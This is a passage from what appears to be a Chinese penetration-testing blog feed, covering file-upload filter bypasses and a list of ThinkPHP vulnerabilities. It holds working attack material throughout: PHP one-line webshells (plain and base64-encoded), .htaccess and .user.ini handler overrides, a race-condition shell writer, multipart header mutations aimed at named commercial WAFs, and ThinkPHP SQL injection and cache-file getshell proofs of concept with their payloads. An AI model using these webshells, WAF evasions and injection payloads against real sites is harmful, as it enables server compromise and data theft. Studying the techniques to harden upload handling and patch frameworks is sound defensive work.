来绕过黑名单，Windows在解析时会删除最后一个.和_还有空格</p><p>3.::$DATA绕过，（只适用于Windows系统）在Windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名</p><p>4.双写绕过，有些函数会替换敏感文件名，但不递归删除的话就可以双写绕过，例如a.phphpp，php被替换为空后就成了a.php</p><p>5.00截断绕过，上传时上传a.php.jpg，抓包在php后添加一个字符修改其HEX值为00，这样解析之后就是a.php了，也绕过了黑名单；<br>常见于ASP程序，JSP也会出现<br>PHP限制条件：<br>php&lt;5.3.4<br>php.ini中的magic_quotes_gpc设置为OFF</p><p>6.上传可解析的扩展文件名，例如：</p><p>asp/aspx:<br>asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</p><p>php :<br>php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</p><p>jsp :<br>jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</p><p>可利用burp fuzz测试</p><p>7..htaccess和.user.ini绕过黑名单</p><p>.htaccess使用条件：<br>.htaccess只适用apache<br>①、Allow Override All<br>②、LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</p><p>.htaccess内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">将所有后缀为.jpg的文件作为php文件解析</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;BaiZe&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-phpBZ</span><br><span class="line">&lt;/FilesMatch&gt;  </span><br><span class="line">将所有文件名包含BaiZe的文件作为php文件解析</span><br></pre></td></tr></table></figure><p>​<br>.user.ini使用条件：</p><p>①.user.ini适用于服务器使用CGI／FastCGI模式且目录下要有可执行的php文件</p><p>.user.ini内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=a.jpg</span><br><span class="line">a.jpg中符合php语言的代码会被执行</span><br></pre></td></tr></table></figure><h4 id="文件头限制"><a href="#文件头限制" class="headerlink" title="文件头限制"></a>文件头限制</h4><p>文件头检测，上传图片马，在修改后缀为可解析脚本语言；或者上传一句话木马在文件中添加正常格式文件头例如：GIF89a</p><h4 id="危险函数检测"><a href="#危险函数检测" class="headerlink" title="危险函数检测"></a>危险函数检测</h4><p>一般为waf对上传文件的内容进行检测</p><p>1.使用动态调用绕过，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[&apos;0&apos;]($_GET[&apos;1&apos;]);?&gt;</span><br><span class="line">此方法不能绕过disable_function</span><br></pre></td></tr></table></figure><p>2.上传编码后的webshell配合.htaccess来解析</p><p>3.上传编码后的webshell，再另外上传一个脚本文件解码webshell并写入新文件，例如下面这段代码为1.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=</span><br></pre></td></tr></table></figure><p>上传后再上传下面为2.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$path =&quot;/xx/xxx/xx/1.php&quot;;</span><br><span class="line"></span><br><span class="line">$str= file_get_contents($path);</span><br><span class="line"></span><br><span class="line">$strs = base64_decode($str);</span><br><span class="line"></span><br><span class="line">$test = fopen(&quot;./test.php&quot;,&quot;w&quot;);test</span><br><span class="line">test</span><br><span class="line">fwrite($test,$strs);</span><br><span class="line">fclose($test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后访问后再访问test.php即可getshell</p><h4 id="WAF拦截绕过"><a href="#WAF拦截绕过" class="headerlink" title="WAF拦截绕过"></a>WAF拦截绕过</h4><p><strong>常用的黑名单绕过方法也适用于部分waf，更多的是需要配合使用才能成功上传，主要思路为接收文件名和waf的检测有所差异，只要是服务器能接收并解析，怎样能绕过waf的检测都可以。</strong></p><p>例如00截断，文件名+;号，文件名+’号，上传hatccess和user.ini，上面概述过的这里不再重复，使用时应配合使用</p><p>1.换行绕过检测，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.p</span><br><span class="line">hp&quot;</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; file</span><br><span class="line">name=&quot;1.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=</span><br><span class="line">&quot;1.php&quot;</span><br><span class="line">三种均可</span><br></pre></td></tr></table></figure><p>2.多个等号绕过检测，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename===&quot;a.php&quot;</span><br></pre></td></tr></table></figure><p>3.增大文件大小，类似于sql注入的垃圾字符绕waf，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure><p>4.去掉或替换引号绕过waf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file1; filename=a.php</span><br><span class="line">Content-Disposition: form-data; name=&apos;file1&apos;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure><p>4.增加filename干扰拦截，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename= ;  filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure><p>5.混淆waf匹配字段，例如</p><p>混淆form-data</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">去除form-data</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: AAAAAAAA=&quot;BBBBBBBB&quot;; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">替换form-data为垃圾值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data   ; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">form-data后加空格</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: for+m-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">form-data中加+</span><br></pre></td></tr></table></figure><p>混淆ConTent-Disposition</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COntEnT-DIsposiTiOn: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">大小写混淆</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">调换Content-Type和ConTent-Disposition的顺序</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA:filename=&quot;aaa.jpg&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 666</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">增加额外的头</span><br></pre></td></tr></table></figure><p>6.双文件绕过，例如安全狗总以最后一个Content-Disposition中的值做为接收参数进行检测，一些中间件例如IIS6.0总是以第一个Content-Disposition中的值做为接收参数。</p><p>7.容器与WAF对Boundary要求规则不一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99</span><br><span class="line">Content-Length: 253</span><br><span class="line">-----------------------------471****1141173****525****99</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br><span class="line">-----------------------------471****1141173****525****99--</span><br></pre></td></tr></table></figure><p>一些WAF会认为两段Boundary不一致的数据是无意义的，不进行检测，而容器并没有严格要求，正常接收数据。</p><p>8.条件竞争，一些情况下在上传文件时，先上传到临时目录，然后再检测，检测到再删除，例如：可以上传生成一句话木马的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(&apos;shell6666.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1])?&gt;&apos;);</span><br></pre></td></tr></table></figure><p>上传同时疯狂重复发包访问此文件，就有可能会在文件被删除之前生成webshell文件a.php</p><h4 id="安全狗绕过"><a href="#安全狗绕过" class="headerlink" title="安全狗绕过"></a>安全狗绕过</h4><p>1.绕过思路：对文件的内容，数据。数据包进行处理。<br>关键点在这里Content-Disposition: form-data; name=”file”; filename=”ian.php”<br>将form-data;            修改为~form-data;</p><p>2.通过替换大小写来进行绕过<br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>Content-Type: application/octet-stream<br>将Content-Disposition    修改为content-Disposition<br>将 form-data            修改为Form-data<br>将 Content-Type         修改为content-Type  </p><p>3.通过删减空格来进行绕过<br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>Content-Type: application/octet-stream<br>将Content-Disposition: form-data          冒号后面 增加或减少一个空格<br>将form-data; name=”file”;                分号后面 增加或减少一个空格<br>将 Content-Type: application/octet-stream   冒号后面 增加一个空格</p><p>4.通过字符串拼接绕过<br>看Content-Disposition: form-data; name=”file”; filename=”yjh3.php”<br>将 form-data 修改为   f+orm-data<br>将 from-data 修改为   form-d+ata</p><p>5.双文件上传绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>6.HTTP header 属性值绕过<br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>我们通过替换form-data 为*来绕过<br>Content-Disposition: *; name=”file”; filename=”yjh.php”</p><p>7.HTTP header 属性名称绕过<br>源代码:<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png”Content-Type: image/png<br>绕过内容如下：<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png<br>C.php”<br>删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php”.</p><p>8.等效替换绕过<br>原内容：<br>Content-Type: multipart/form-data; boundary=—————————471463142114<br>修改后:<br>Content-Type: multipart/form-data; boundary =—————————471463142114<br>boundary后面加入空格。</p><p>9.修改编码绕过<br>使用UTF-16、Unicode、双URL编码等等</p><h4 id="百度云上传绕过"><a href="#百度云上传绕过" class="headerlink" title="百度云上传绕过"></a>百度云上传绕过</h4><p>百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.jpg .Php”</p><h4 id="阿里云上传绕过"><a href="#阿里云上传绕过" class="headerlink" title="阿里云上传绕过"></a>阿里云上传绕过</h4><p>源代码：<br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.jpg .Php”Content-Type: image/jpeg<br>修改如下：<br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.php”<br>没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</p><h4 id="360主机上传绕过"><a href="#360主机上传绕过" class="headerlink" title="360主机上传绕过"></a>360主机上传绕过</h4><p>源代码:<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png”Content-Type: image/png<br>绕过内容如下：<br>Content- Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png<br>Content-Disposition 修改为 Content-空格Disposition</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传绕过常规姿势&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP 漏洞列表</title>
    <link href="http://yoursite.com/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/"/>
    <id>http://yoursite.com/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/</id>
    <published>2020-05-12T14:17:14.000Z</published>
    <updated>2020-05-12T14:40:18.766Z</updated>
    
    <content type="html"><![CDATA[<p>ThinkPHP漏洞，很久之前看到的，忘记是哪位老哥整理的了，我也添加了一些，做个记录（陆续会添加）。</p><a id="more"></a><h2 id="ThinkPHP-漏洞列表"><a href="#ThinkPHP-漏洞列表" class="headerlink" title="ThinkPHP 漏洞列表"></a>ThinkPHP 漏洞列表</h2><blockquote><p>可能存在的漏洞<br>[x] SQL注入<br>[x] 后台弱口令<br>[x] Debug模式下的日志记录<br>其实这三个我最寄托于debug的日志记录，这里很多文章大牛分析了路径为：<br>thinkphp3 log日志路径<br>Application//Runtime/Logs/Home/20_05_01.log<br>Application//Runtime/Logs/Admin/20_05_01.log<br>Application//Runtime/Logs/Index/20_05_01.log<br>Runtime\Logs\Home\16_09_09.log  </p></blockquote><blockquote><p>thinphp5 log日志路径<br>Application//Runtime/Logs/202005/01.log<br>Runtime/Log/202002/15.log  </p></blockquote><h3 id="一、3-x"><a href="#一、3-x" class="headerlink" title="一、3.x"></a>一、3.x</h3><blockquote><p>使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> /var/www/tp3</span><br></pre></td></tr></table></figure></blockquote><h4 id="ThinkPHP3-2-3-缓存函数设计缺陷可导致Getshell"><a href="#ThinkPHP3-2-3-缓存函数设计缺陷可导致Getshell" class="headerlink" title="ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell"></a>ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell</h4><table><thead><tr><th>标题</th><th>ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell</th></tr></thead><tbody><tr><td>时间</td><td>2017-08-09</td></tr><tr><td>版本</td><td>&lt;= 3.2.3</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></td></tr></tbody></table><h4 id="ThinkPHP3-2-3-最新版update注入漏洞"><a href="#ThinkPHP3-2-3-最新版update注入漏洞" class="headerlink" title="ThinkPHP3.2.3_最新版update注入漏洞"></a>ThinkPHP3.2.3_最新版update注入漏洞</h4><table><thead><tr><th>标题</th><th>Thinkphp3.2.3最新版update注入漏洞</th></tr></thead><tbody><tr><td>时间</td><td>2018-04-16</td></tr><tr><td>版本</td><td>&lt;= 3.2.3</td></tr><tr><td>文章链接</td><td><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104847</a></td></tr></tbody></table><h4 id="ThinkPHP3-2-X-find-select-delete注入"><a href="#ThinkPHP3-2-X-find-select-delete注入" class="headerlink" title="ThinkPHP3.2.X_find_select_delete注入"></a>ThinkPHP3.2.X_find_select_delete注入</h4><table><thead><tr><th>标题</th><th>thinkphp3.2 find_select_delete注入</th></tr></thead><tbody><tr><td>时间</td><td>2018-08-23</td></tr><tr><td>版本</td><td>&lt;= 3.2.3</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">https://xz.aliyun.com/t/2631</a><br><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a></td></tr></tbody></table><h4 id="ThinkPHP3-X-order-by注入漏洞"><a href="#ThinkPHP3-X-order-by注入漏洞" class="headerlink" title="ThinkPHP3.X_order_by注入漏洞"></a>ThinkPHP3.X_order_by注入漏洞</h4><table><thead><tr><th>标题</th><th>ThinkPHP 3.X/5.X order by注入漏洞</th></tr></thead><tbody><tr><td>时间</td><td>2018-08-29</td></tr><tr><td>版本</td><td>&lt;= 3.2.3</td></tr><tr><td>文章链接</td><td><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></td></tr></tbody></table><h3 id="二、5-x"><a href="#二、5-x" class="headerlink" title="二、5.x"></a>二、5.x</h3><blockquote><p>使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> /var/www/tp5</span><br></pre></td></tr></table></figure></blockquote><h4 id="ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露"><a href="#ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露" class="headerlink" title="ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露"></a>ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露</h4><table><thead><tr><th>标题</th><th>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</th></tr></thead><tbody><tr><td>时间</td><td>2017-07-03</td></tr><tr><td>版本</td><td>&lt; 5.0.9</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a>  <br><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></td></tr></tbody></table><blockquote><p>测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;git checkout 02f8e8a</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">  $ids = input(<span class="string">'ids/a'</span>);</span><br><span class="line">  $result = db(<span class="string">'user'</span>)-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</span><br><span class="line">  var_dump($result);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;testsql?ids[<span class="number">0</span>,updatexml(<span class="number">0</span>,concat(<span class="number">0xa</span>,user()),<span class="number">0</span>)]=<span class="number">1231</span></span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2017-07-03.png" alt="img"></p></blockquote><h4 id="ThinkPHP5-0-10-3-2-3-缓存函数设计缺陷可导致Getshell"><a href="#ThinkPHP5-0-10-3-2-3-缓存函数设计缺陷可导致Getshell" class="headerlink" title="ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell"></a>ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell</h4><table><thead><tr><th>标题</th><th>ThinkPHP5.0.10-3.2.3 缓存函数设计缺陷可导致Getshell</th></tr></thead><tbody><tr><td>时间</td><td>2017-08-09</td></tr><tr><td>版本</td><td>&lt; 5.0.11</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></td></tr></tbody></table><blockquote><p>测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;git checkout 094dde5</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">  $user = input(<span class="string">'post.'</span>);</span><br><span class="line">  $m=db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert($user);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cache</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">  $m = db(<span class="string">'user'</span>)-&gt;select();</span><br><span class="line">  Cache::set(<span class="string">'name'</span>,$m,<span class="number">3600</span>);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;post data:</span><br><span class="line">  username=%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">3</span>Deval(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>a%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">&gt;注：%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>A = <span class="comment">//+回车</span></span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2017-08-09-1.png" alt="img"></p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2017-08-09-2.png" alt="img"></p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2017-08-09-3.png" alt="img"></p><p>其中文件路径和名称是 b0+68931cc450442b63f5b3d276ea4297 而</p><p>md5(‘name’) = b068931cc450442b63f5b3d276ea4297</p></blockquote><h4 id="ThinkPHP框架5-0-X-sql注入漏洞分析"><a href="#ThinkPHP框架5-0-X-sql注入漏洞分析" class="headerlink" title="ThinkPHP框架5.0.X_sql注入漏洞分析"></a>ThinkPHP框架5.0.X_sql注入漏洞分析</h4><table><thead><tr><th>标题</th><th>ThinkPHP框架 5.0.x sql注入漏洞分析</th></tr></thead><tbody><tr><td>时间</td><td>2018-04-09</td></tr><tr><td>版本</td><td>&lt; 5.0.16</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a></td></tr></tbody></table><blockquote><p>测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;git checkout 7c13757</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $username = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">       db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;testsql?username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2018-04-09.png" alt="img"></p></blockquote><h4 id="ThinkPHP5-X-order-by注入漏洞"><a href="#ThinkPHP5-X-order-by注入漏洞" class="headerlink" title="ThinkPHP5.X_order_by注入漏洞"></a>ThinkPHP5.X_order_by注入漏洞</h4><table><thead><tr><th>标题</th><th>ThinkPHP 3.X/5.X order by注入漏洞</th></tr></thead><tbody><tr><td>时间</td><td>2018-08-23</td></tr><tr><td>版本</td><td>&lt;= 5.1.22</td></tr><tr><td>文章链接</td><td><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></td></tr></tbody></table><blockquote><p>测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;git checkout 35e9878</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">  $order = input(<span class="string">'get.order'</span>);</span><br><span class="line">  $m = db(<span class="string">'user'</span>)-&gt;order($order)-&gt;find();</span><br><span class="line">  var_dump($m);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td 